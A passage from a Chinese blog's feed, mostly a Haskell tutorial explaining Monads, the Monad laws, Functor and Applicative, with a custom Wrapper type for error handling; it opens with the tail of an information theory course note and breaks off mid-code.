style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6597em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">s</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 这个 s 个矩阵。</p><p>(待续)</p><p>（<strong>不写笔记了，这门课很多概念就是没有搞清楚，课程要求也是会背公式，计算就可以了。我去理解原理反而有害分数，而且非常费力。</strong>）</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;blockquote&gt;
&lt;ol class=&quot;series-items&quot;&gt;&lt;li&gt;&lt;a href=&quot;/cs-courses/C-language-basis/&quot; title=&quot;C语言基础&quot;&gt;C语言基础&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/cs-courses/modular-inverses/&quot; title=&quot;乘法逆元&quot;&gt;乘法逆元&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/cs-courses/cpp-cryptographic-algorithm-basis/&quot; title=&quot;信息安全算法基础&quot;&gt;信息安全算法基础&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/cs-courses/OS/&quot; title=&quot;操作系统基础&quot;&gt;操作系统基础&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/cs-courses/x86-masm/&quot; title=&quot;x86汇编基础&quot;&gt;x86汇编基础&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/cs-courses/information-theory/&quot; title=&quot;信息论与编码&quot;&gt;信息论与编码&lt;/a&gt;&lt;/li&gt;&lt;/ol&gt;
&lt;/blockquote&gt;
&lt;</summary>
        
      
    
    
    
    <category term="courses" scheme="https://www.blog-blockchain.xyz/categories/courses/"/>
    
    
    <category term="information" scheme="https://www.blog-blockchain.xyz/tags/information/"/>
    
  </entry>
  
  <entry>
    <title>Haskell(三) Monad</title>
    <link href="https://www.blog-blockchain.xyz/fp/monad/"/>
    <id>https://www.blog-blockchain.xyz/fp/monad/</id>
    <published>2023-05-26T16:42:33.000Z</published>
    <updated>2024-11-15T14:30:54.923Z</updated>
    
    <content type="html"><![CDATA[<blockquote><ol class="series-items"><li><a href="/fp/FP-haskell-1/" title="Haskell(一)入门">Haskell(一)入门</a></li><li><a href="/fp/FP-haskell-2/" title="Haskell(二)函数式编程">Haskell(二)函数式编程</a></li><li><a href="/fp/monad/" title="Haskell(三) Monad">Haskell(三) Monad</a></li><li><a href="/fp/Haskell-summary-toolchain/" title="Haskell(四)总结和工具链">Haskell(四)总结和工具链</a></li><li><a href="/fp/Haskell-epilogue/" title="Haskell(五) 总结和展望">Haskell(五) 总结和展望</a></li><li><a href="/fp/project-euler/" title="Haskell(六) Project Euler 练习1-26">Haskell(六) Project Euler 练习1-26</a></li></ol></blockquote><h1>前言</h1><p>我并不是相关数学理论研究者，而是 Haskell 和 Program language 的爱好者，研究水平还比较低，所以理解有错误是可能发生的，非常欢迎交流和指正。文章中引用了其他博客，我都已经明确注明来源和附带链接，如果您是这些博客的作者，也不同意被引用，那么请联系我。本文借用了 GPT4 写作，提供了非常多的指导。AI 正在改变学习的方式。</p><p>另外，我希望读者有一定的近世代数基础，也有一定的编程范式的理解，比如函数式语言（FP），特别是代码讲解都是基于 Haskell。由于我并没有实际的 Haskell 开发经验，所以我不熟悉 <code>Monad</code>的实际应用和用法，这篇文章只是给一个 demo，用于了解编程中的 <code>Monad</code> 的概念。</p><p>最后，对于 PL 和 software analysis 爱好者和研究者，可能我不多的感触是，学习一些抽象代数是很有助于锻炼思维的，不只一个老师这样提过建议了。</p><p>具体内容可以参考：<a href="https://wiki.haskell.org/Monad_tutorials_timeline">https://wiki.haskell.org/Monad_tutorials_timeline</a></p><h1>理论介绍</h1><h2 id="Monad-的应用">Monad 的应用</h2><p><code>Monad</code> 是函数式编程中一个重要的抽象概念，它能够帮助我们有效地处理函数组合、副作用等问题。在许多编程语言（如 Haskell、Scala、Rust 等）中，<code>Monad</code> 都有广泛的应用。</p><p>下面是一些常见的<code>Monad</code>及其用途：</p><ol><li><code>Maybe Monad</code>（在一些语言中叫 <code>Option Monad</code>）：这种 <code>Monad</code> 常用于处理可能存在的错误或缺失值。它通常包含两种值：<code>Just a</code>（表示有值）和<code>Nothing</code>（表示无值）。这种方式可以避免显示的错误检查，让代码更简洁。</li><li><code>List Monad</code>：这种 <code>Monad</code> 可以用来处理具有多个可能结果的计算。<code>List Monad</code> 将多个可能的结果视为一种副作用，并提供了一种结构化的方式来处理这种副作用。比如说 <code>[1,2] &gt;&gt;= \x -&gt; return (x+1)</code></li><li><code>IO Monad</code>：这是一个特殊的 <code>Monad</code>，用于处理那些可能带有副作用的 I/O 操作。在纯函数式编程语言中，I/O 操作会破坏函数的纯粹性，因此通过 <code>IO Monad</code>，我们可以在不破坏纯函数性质的情况下，进行 I/O 操作。</li><li><code>State Monad</code>：这种 <code>Monad</code> 可以用来在纯函数式编程中模拟带有状态的计算。通过 <code>State Monad</code>，我们可以在不直接修改变量的情况下，进行状态的更新。</li><li><code>DBIO Monad</code>：这是一种用于数据库交互的 <code>Monad</code>。<code>DBIO</code> 代表数据库 I/O，它允许你以一种声明式、纯函数式的方式编写数据库操作，同时确保操作的原子性和一致性。</li></ol><p>以上只是一些最常见的 <code>Monad</code> 的应用，实际上 <code>Monad</code> 的应用非常广泛。任何可以用<strong>Monad laws</strong>（即<code>Monad</code>的三个基本法则：左单位律、右单位律和结合律）描述的结构，都可以看作是一个 <code>Monad</code>，都可以利用 <code>Monad</code> 提供的优雅、强大的函数式编程工具进行处理。</p><h2 id="Monad-的必要性">Monad 的必要性</h2><p>下面引用的内容来自「什么是 Monad (Functional Programming)？ - <a href="https://www.zhihu.com/question/19635359/answer/172074046">刘月半的回答 - 知乎</a> 」。因为他说明了 <code>Monad</code> 在错误处理方面的优势，简单地说，就是可以通过定义规则，统一地处理，而不是那么复杂每一步都错误处理。</p><blockquote><h2 id="一个自函子范畴上的幺半群">一个自函子范畴上的幺半群</h2><p>程序语言中有一种常见的构造「函子」（functor）。Haskell 里的 Maybe 是个很好的例子：<br>(作者补充：a 可以是一个类型，然后 Maybe 的 Kind 就从 *-&gt;* 变成了 *，可以类比泛型 &gt;)</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">data</span> <span class="type">Maybe</span> a = <span class="type">Just</span> a | <span class="type">Nothing</span></span></span><br></pre></td></tr></table></figure><p>(作者补充 *-&gt;* 通过推导变成了 *，但是我们有时候要用第一个，有时候要用第二个，那么 fmap 就是用来提取第二个，提取出来给 f 操作之后又放回 *-&gt;*，变成*)<br>Maybe 之所以是函子，是因为它可以通过 fmap（functor map）把所有的函数拎到「Maybe 空间」里。换而言之，令 f :: a -&gt; b，fmap f :: Maybe a -&gt; Maybe b。fmap 定义如下：</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">fmap</span> :: (a -&gt; b) -&gt; (<span class="type">Maybe</span> a -&gt; <span class="type">Maybe</span> b)</span><br><span class="line"><span class="title">fmap</span> f mbx = <span class="keyword">case</span> mbx <span class="keyword">of</span></span><br><span class="line">  <span class="type">Just</span> x  -&gt; <span class="type">Just</span> (f x)</span><br><span class="line">  <span class="type">Nothing</span> -&gt; <span class="type">Nothing</span></span><br></pre></td></tr></table></figure><p>Maybe 可以方便地用来做错误处理。对于那些不支持 Maybe 作输入的函数，我们也可以通过 fmap 兼容之。但是，组合多个会产生 Maybe 的函数很麻烦。比如说这个除法函数：</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">safeDiv</span> :: <span class="type">Int</span> -&gt; <span class="type">Int</span> -&gt; <span class="type">Maybe</span> <span class="type">Int</span></span><br><span class="line">  safeDiv _ <span class="number">0</span> = <span class="type">Nothing</span></span><br><span class="line">  safeDiv x y = <span class="type">Just</span> (x / y)</span><br></pre></td></tr></table></figure><p>考虑一下表达式：</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">case</span> safeDiv a b <span class="keyword">of</span></span><br><span class="line">  <span class="type">Nothing</span> -&gt; <span class="type">Nothing</span></span><br><span class="line">  <span class="type">Just</span> x  -&gt; <span class="keyword">case</span> safeDiv c x <span class="keyword">of</span></span><br><span class="line">    <span class="type">Nothing</span> -&gt; <span class="type">Nothing</span></span><br><span class="line">    <span class="type">Just</span> y  -&gt; <span class="keyword">case</span> safeDiv d y <span class="keyword">of</span></span><br><span class="line">      <span class="type">Nothing</span> -&gt; <span class="type">Nothing</span></span><br><span class="line">      <span class="type">Just</span> z  -&gt; safeDiv e z</span><br></pre></td></tr></table></figure><p>在 JavaScript 界，我们管这样的代码叫「callback hell」。不过这段代码总比下面这段好：</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">let</span> x = safeDiv a b</span><br><span class="line">    y = fmap (safeDiv c) x</span><br><span class="line">    z = (fmap . fmap) (safeDiv d) y</span><br><span class="line">    <span class="keyword">in</span> (fmap . fmap . fmap) (safeDiv e) z</span><br></pre></td></tr></table></figure></blockquote><p>他提到的回调地狱，实际上是说 <code>Monad</code> 可以任意层等封装和解封装。「怎样用简单的语言解释 Monad？ - <a href="https://www.zhihu.com/question/24972880/answer/134078723">Belleve 的回答 - 知乎</a>」这里有部分图片，就解释的比较清楚。</p><blockquote><p>使用 join 诠释的话，<code>Monad</code> 会有一个<strong>非常</strong>不同的理解：<code>Monad</code> 是可以增（return/unit）减（join）层数的「箱子」。而 unit 和 join 因为满足某些定律所以形成了一个幺半群（对，这就是那老梗）。<strong>所以，<code>Monad</code> 代表的是层次，而不是顺序。（回想下 CPS，是不是用层次表示顺序的？）</strong></p><img src="http://cdn.blog-blockchain.xyz/202305262331399.png" alt="img" style="zoom: 33%;" /><p>Haskell 的 bind 可以看作 fmap 和 join 的复合</p><img src="http://cdn.blog-blockchain.xyz/202305262331351.png" alt="img" style="zoom:33%;" /><p>首先解释 Endofunctor，Endofunctor 是（不加限制的）箱子，它把类型（一个类型范畴里的对象）T 装进去变成 F(T)，同时还能保证所有函数（态射）A-&gt;B，都有一个带箱子的版本 F(A)-&gt;F(B)。</p><p>而 <code>Monad</code> 呢？就是除了前面的两个箱子，我们还能定义出把任意类型的数值装进箱子的 unit：T-&gt;F(T)，以及把两层箱子只留一层的 join：F(F(T))-&gt;F(T)。</p></blockquote><h2 id="Monad-laws">Monad laws</h2><blockquote><p>下面内容看不太懂，太正常不过了，读者只需要有一个印象。等阅读了后面的代码详解，理解思路和用法，从使用的规律去看待它的性质，会有不一样的体会。</p></blockquote><p>Monad laws 是指三个性质，这些性质定义了一个有效的 <code>Monad</code> 应该如何表现。这些法则在所有的 <code>Monad</code> 实例中都应该成立，以确保在 <code>Monad</code> 的计算中可以进行一些有用的推理和转换。具体来说，这三个法则是：</p><ol><li><p><strong>左恒等法则 (Left Identity)</strong>：如果我们将一个值用 <code>return</code> 放入一个 <code>Monad</code>，然后应用函数 <code>f</code>，那么结果应该和直接将该值应用到 <code>f</code> 是一样的。用公式表示就是 <code>return a &gt;&gt;= f == f a</code><br>比如说，<code>(return 1)</code> 返回了 <code>(Monad m, Num a) =&gt; m a</code> 类型的 monad，然后呢 f 是 (\x -&gt; return (x*2))，类型为 (Monad m, Num a) =&gt; a -&gt; m a。那么得到的结果 <code>(return 5) &gt;&gt;=(\x -&gt; return (x\*2))</code> 应该等于 <code>(\x -&gt; return (x*2)) 5</code></p></li><li><p><strong>右恒等法则 (Right Identity)</strong>：如果我们有一个 <code>Monad</code> 值 <code>m</code>，然后我们用 <code>return</code> 作为 bind 操作的右操作数，那么结果就应该等于原来的 <code>Monad</code> 值。用公式表示就是 <code>m &gt;&gt;= return == m</code>。比如 m 是 <code>return 4</code> 类型为 <code>(Monad m, Num a) =&gt; m a</code>，那么 <code>((return 4) &gt;&gt;= return)</code> 的类型是 <code>(Monad m, Num b) =&gt; m b</code>。</p></li><li><p><strong>结合律 (Associativity)</strong>：当我们有三个操作串在一起时，应用的顺序不应该影响结果。也就是说，我们应该可以在不改变结果的情况下，改变括号的位置。用公式表示就是 <code>(m &gt;&gt;= f) &gt;&gt;= g == m &gt;&gt;= (\x -&gt; f x &gt;&gt;= g)</code>。<br>比如定义 <code>f x= return (2*x)</code>, <code>g x= return (x+1)</code>，<code>m= return 4</code>，注意 <code>return</code> 的优先级很高，需要括号。那么左边应该是 9，类型为 (Monad m, Num b) =&gt; m b， 右边的结果也是完全一样的。注意 <code>m &gt;&gt;= (f&gt;&gt;= g) </code> 语法是错的，因为 g 需要 monad 类型，而不是 <code>(Monad m, Num a) =&gt; a -&gt; m a</code></p></li></ol><p><code>Monad</code> laws 为我们提供了一种方法来推理我们的 <code>Monad</code> 代码，并确保它的行为是一致的。如果你创建自己的 <code>Monad</code> 实例，那么你应该确保这些法则在你的实例中成立。</p><h1>代码示例</h1><h2 id="基础介绍">基础介绍</h2><p>注意，这是基于 ghc-9.2.7 的 Haskell 版本，语法可能是 9.0 之后的了。另外，前置知识实在太多，比如说介绍 Monad laws 时的类型签名，可能读者理解起来都有些困难。读者可以阅读我的 Haskell 文章：</p><ul><li><p><a href="https://www.blog-blockchain.xyz/fp/FP-haskell-1/">Haskell 入门(一)</a></p></li><li><p><a href="https://www.blog-blockchain.xyz/fp/FP-haskell-2/">Haskell 函数式编程(二)</a></p></li><li><p>如果希望掌握 Haskell，那么一定要完成完成<a href="https://github.com/kowainik/learn4haskell">Learn4Haskell</a></p></li></ul><p>使用 <code>Monad</code> 可以使错误处理更加简洁和高效。这是因为 <code>Monad</code> 提供了一种方式，允许你将可能产生错误的计算组合在一起，<br>同时在计算的过程中，一旦检测到错误，计算就会立即停止，并返回一个表示错误的值。</p><p>我们可以将多个可能产生错误的函数使用 <code>&gt;&gt;=</code> 运算符链接起来。当每一个函数在其运算过程中产生一个错误（即返回 Nothing）时，<br>整个链条上的后续计算就会立即停止，而不需要进一步的错误检查。</p><p>再者，<code>Monad</code> 也可以帮助你处理其他种类的副作用，比如输入/输出、状态变化、异常处理等等。这是因为 <code>Monad</code> 提供了一种将复杂操作封装成单个值的方式，这样你就可以像处理普通的值一样来处理这些操作。<br>在这个过程中，<code>Monad</code> 为你处理了所有复杂的细节。</p><p><code>Monad</code>一般有如下几个部分组成，<strong>任何 <code>Monad</code> 都是一个 <code>Applicative</code>，任何 <code>Applicative </code>都是一个 <code>Functor</code></strong>。</p><blockquote><p>标注:L 对于一个 Monad，表示为 m a,其中 a 叫做 monad 的封装的值，m 叫做 monad 构造器。</p></blockquote><ul><li><strong>Functor</strong>：提供了一个基本的映射操作 <code>fmap</code>。<code>fmap </code>接收一个函数和一个 <code>Functor </code>，然后将这个函数作用于 <code>Functor </code>中封装的值。</li><li><strong>Applicative</strong>：扩展了 <code>Functor</code>，增加了更多操作。它的核心是一个叫做<code> &lt;*&gt;</code> 的操作符，它允许我们通过 <code>liftA2 </code>等函数或者直接使用<code>&lt;*&gt;</code>，对封装好的变量（也就是 m a）操作。此外，<code>Applicative </code>还提供了 <code>pure </code>函数，用于将一个普通的值放入 <code>Applicative </code>上下文中。</li><li><strong>Monad</strong>：再次扩展了 Applicative，提供了一个新的操作<code>&gt;&gt;=</code>(也叫 <code>bind </code>操作)。它接收一个 <code>Monad</code> 值和一个函数，这个函数接收一个普通的值，返回一个 <code>Monad</code> 值。通过 bind 操作，我们可以更方便地将多个 <code>Monad</code> 操作链接在一起。</li></ul><blockquote><p>作者并不熟悉这些定义在数学上的差别</p></blockquote><h2 id="Functor">Functor</h2><p><code>Functor</code> 是能够通过 <code>fmap </code>函数将一个普通函数映射到某种结构中的类型。这使得你可以将函数作用于这种结构中的值，而不需要关心结构的具体内容。可以 f 类比上面的 m。</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="type">Functor</span> f <span class="keyword">where</span></span></span><br><span class="line">    fmap :: (a -&gt; b) -&gt; f a -&gt; f b</span><br></pre></td></tr></table></figure><p><code>fmap</code> 可以把 functor 封装的值类型的函数，映射到 functor 的函数。比如说下面 f 只能处理 数值，比如 <code>f 2 =4</code>，g 封装之后 可以处理 <code>f (return 2)</code>，返回 <code>Monad f =&gt; f Int</code> 的 4</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">f</span> :: <span class="type">Int</span> -&gt; <span class="type">Int</span></span><br><span class="line"><span class="title">f</span> x = <span class="number">2</span> * x</span><br><span class="line"></span><br><span class="line"><span class="title">g</span>:: (<span class="type">Functor</span> f) =&gt; f <span class="type">Int</span> -&gt; f <span class="type">Int</span></span><br><span class="line"><span class="title">g</span> = fmap f</span><br></pre></td></tr></table></figure><h2 id="Applicative">Applicative</h2><p><code>Applicative Functor</code> (通常简称为 <code>Applicative</code>) 是 <code>Functor </code>的一种扩展，提供了在 <code>Functor </code>的基础上进行更复杂操作的能力。<code>Applicative </code>提供了 <code>pure </code>函数，用于将普通值放入 <code>Applicative </code>结构，以及 <code>&lt;*&gt;</code> 操作符，使得你可以在不需要拆解 <code>Applicative </code>结构的情况下进行更复杂的计算。</p><p>下面就通过 pure 代替 return，封装了函数 f，而 <code>&lt;*&gt;::Applicative f =&gt; f (a -&gt; b) -&gt; f a -&gt; f b</code>，所以</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">f</span> :: <span class="type">Int</span> -&gt; <span class="type">Int</span></span><br><span class="line"><span class="title">f</span> x = <span class="number">2</span> * x</span><br><span class="line"></span><br><span class="line"><span class="title">h</span> :: (<span class="type">Applicative</span> f) =&gt; f (<span class="type">Int</span> -&gt; <span class="type">Int</span>)</span><br><span class="line"><span class="title">h</span> = pure f</span><br></pre></td></tr></table></figure><h2 id="Monad">Monad</h2><p><code>Monad</code> 是 <code>Applicative </code>的一种扩展，提供了更强大的组合操作的能力。特别的，<code>Monad </code>提供了<code>&gt;&gt;=</code>操作符 (也叫 bind 操作)，这个操作可以将一个产生 <code>Monad </code>值的函数应用于另一个 <code>Monad </code>值。这使得你可以根据一个 <code>Monad </code>值的结果来决定进行下一步的计算，这是 <code>Functor </code>和 <code>Applicative</code> 无法做到的。<br>下面是为自定义的 Wrapper 类型，实现了三种特殊的类型类。Wrapper 可以为 Num 类型类的类型，实现自己定义的 +, -, *, 除,返回符号的功能。</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">module</span> Main <span class="keyword">where</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 隐藏默认的typeclasee，然后自己重新定义</span></span><br><span class="line"><span class="keyword">import</span> Prelude <span class="keyword">hiding</span> (<span class="type">Applicative</span>, <span class="type">Functor</span>, <span class="type">Monad</span>, <span class="title">fmap</span>, <span class="title">pure</span>, <span class="title">return</span>, (&gt;&gt;=))</span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="keyword">class</span> (<span class="type">Functor</span> <span class="title">f</span>) =&gt; <span class="type">Applicative</span> f <span class="keyword">where</span></span></span><br><span class="line">  pure :: a -&gt; f a</span><br><span class="line">  (&lt;*&gt;) :: f (a -&gt; b) -&gt; f a -&gt; f b</span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="type">Functor</span> f <span class="keyword">where</span></span></span><br><span class="line">  fmap :: (a -&gt; b) -&gt; f a -&gt; f b</span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="keyword">class</span> (<span class="type">Applicative</span> <span class="title">m</span>) =&gt; <span class="type">Monad</span> m <span class="keyword">where</span></span></span><br><span class="line">  (&gt;&gt;=) :: <span class="keyword">forall</span> a b. m a -&gt; (a -&gt; m b) -&gt; m b</span><br><span class="line">  return :: a -&gt; m a</span><br><span class="line"><span class="comment">--------------------------------------------</span></span><br><span class="line"><span class="comment">-- 自定义类型</span></span><br><span class="line"><span class="class"><span class="keyword">data</span> <span class="type">Wrapper</span> a = <span class="type">Ok</span> a | <span class="type">Err</span> <span class="type">String</span></span></span><br><span class="line"></span><br><span class="line"><span class="title">ok</span> :: a -&gt; <span class="type">Wrapper</span> a</span><br><span class="line"><span class="title">ok</span> = <span class="type">Ok</span></span><br><span class="line"><span class="comment">--------------------------------------------</span></span><br><span class="line"><span class="comment">-- 实现这些typeclass</span></span><br><span class="line"><span class="class"><span class="keyword">instance</span> <span class="type">Functor</span> <span class="type">Wrapper</span> <span class="keyword">where</span></span></span><br><span class="line">  fmap f (<span class="type">Ok</span> x) = <span class="type">Ok</span> (f x)</span><br><span class="line">  fmap _ (<span class="type">Err</span> msg) = <span class="type">Err</span> msg</span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="keyword">instance</span> <span class="type">Applicative</span> <span class="type">Wrapper</span> <span class="keyword">where</span></span></span><br><span class="line">  pure = <span class="type">Ok</span></span><br><span class="line">  (<span class="type">Ok</span> f) &lt;*&gt; (<span class="type">Ok</span> x) = <span class="type">Ok</span> (f x)</span><br><span class="line">  (<span class="type">Err</span> msg) &lt;*&gt; _ = <span class="type">Err</span> msg</span><br><span class="line">  _ &lt;*&gt; (<span class="type">Err</span> msg) = <span class="type">Err</span> msg</span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="keyword">instance</span> <span class="type">Monad</span> <span class="type">Wrapper</span> <span class="keyword">where</span></span></span><br><span class="line">  (<span class="type">Ok</span> x) &gt;&gt;= f = f x</span><br><span class="line">  (<span class="type">Err</span> msg) &gt;&gt;= _ = <span class="type">Err</span> msg</span><br><span class="line">  return = <span class="type">Ok</span></span><br><span class="line"><span class="comment">--------------------------------------------</span></span><br><span class="line"><span class="comment">-- 实现自定义的操作</span></span><br><span class="line"><span class="class"><span class="keyword">instance</span> (<span class="type">Num</span> <span class="title">a</span>) =&gt; <span class="type">Num</span> (<span class="type">Wrapper</span> <span class="title">a</span>) <span class="keyword">where</span></span></span><br><span class="line">  (<span class="type">Ok</span> x) + (<span class="type">Ok</span> y) = <span class="type">Ok</span> (x + y)</span><br><span class="line">  (<span class="type">Err</span> msg) + _ = <span class="type">Err</span> msg</span><br><span class="line">  _ + (<span class="type">Err</span> msg) = <span class="type">Err</span> msg</span><br><span class="line"></span><br><span class="line">  (<span class="type">Ok</span> x) - (<span class="type">Ok</span> y) = <span class="type">Ok</span> (x - y)</span><br><span class="line">  (<span class="type">Err</span> msg) - _ = <span class="type">Err</span> msg</span><br><span class="line">  _ - (<span class="type">Err</span> msg) = <span class="type">Err</span> msg</span><br><span class="line"></span><br><span class="line">  (<span class="type">Ok</span> x) * (<span class="type">Ok</span> y) = <span class="type">Ok</span> (x * y)</span><br><span class="line">  (<span class="type">Err</span> msg) * _ = <span class="type">Err</span> msg</span><br><span class="line">  _ * (<span class="type">Err</span> msg) = <span class="type">Err</span> msg</span><br><span class="line"></span><br><span class="line">  abs (<span class="type">Ok</span> x) = <span class="type">Ok</span> (abs x)</span><br><span class="line">  abs (<span class="type">Err</span> msg) = <span class="type">Err</span> msg</span><br><span class="line"></span><br><span class="line">  signum (<span class="type">Ok</span> x) = <span class="type">Ok</span> (signum x)</span><br><span class="line">  signum (<span class="type">Err</span> msg) = <span class="type">Err</span> msg</span><br><span class="line"></span><br><span class="line">  fromInteger x = <span class="type">Ok</span> (fromInteger x)</span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="keyword">instance</span> (<span class="type">Fractional</span> <span class="title">a</span>, <span class="type">Eq</span> <span class="title">a</span>) =&gt; <span class="type">Fractional</span> (<span class="type">Wrapper</span> <span class="title">a</span>) <span class="keyword">where</span></span></span><br><span class="line">  (<span class="type">Ok</span> x) / (<span class="type">Ok</span> <span class="number">0</span>) = <span class="type">Err</span> <span class="string">&quot;Division by zero&quot;</span></span><br><span class="line">  (<span class="type">Ok</span> x) / (<span class="type">Ok</span> y) = <span class="type">Ok</span> (x / y)</span><br><span class="line">  (<span class="type">Err</span> msg) / _ = <span class="type">Err</span> msg</span><br><span class="line">  _ / (<span class="type">Err</span> msg) = <span class="type">Err</span> msg</span><br><span class="line"></span><br><span class="line">  fromRational r = <span class="type">Ok</span> (fromRational r)</span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="keyword">instance</span> (<span class="type">Show</span> <span class="title">a</span>) =&gt; <span class="type">Show</span> (<span class="type">Wrapper</span> <span class="title">a</span>) <span class="keyword">where</span></span></span><br><span class="line">  show (<span class="type">Ok</span> x) = <span class="string">&quot;Ok &quot;</span> ++ show x</span><br><span class="line">  show (<span class="type">Err</span> msg) = <span class="string">&quot;Err &quot;</span> ++ msg</span><br><span class="line"><span class="comment">--------------------------------------------</span></span><br><span class="line"><span class="comment">-- 用于显示特性的例子</span></span><br><span class="line"><span class="title">divideAndAdd</span> :: (<span class="type">Eq</span> a, <span class="type">Fractional</span> a) =&gt; <span class="type">Wrapper</span> a -&gt; <span class="type">Wrapper</span> a -&gt; <span class="type">Wrapper</span> a -&gt; <span class="type">Wrapper</span> a -&gt; <span class="type">Wrapper</span> a</span><br><span class="line"><span class="title">divideAndAdd</span> x1 y1 x2 y2 = x1 / y1 &gt;&gt;= \result1 -&gt; x2 / y2 &gt;&gt;= \result2 -&gt; return (result1 + result2)</span><br><span class="line"></span><br><span class="line"><span class="title">divideAndAdd2</span> :: (<span class="type">Eq</span> a, <span class="type">Fractional</span> a) =&gt; <span class="type">Wrapper</span> a -&gt; <span class="type">Wrapper</span> a -&gt; <span class="type">Wrapper</span> a -&gt; <span class="type">Wrapper</span> 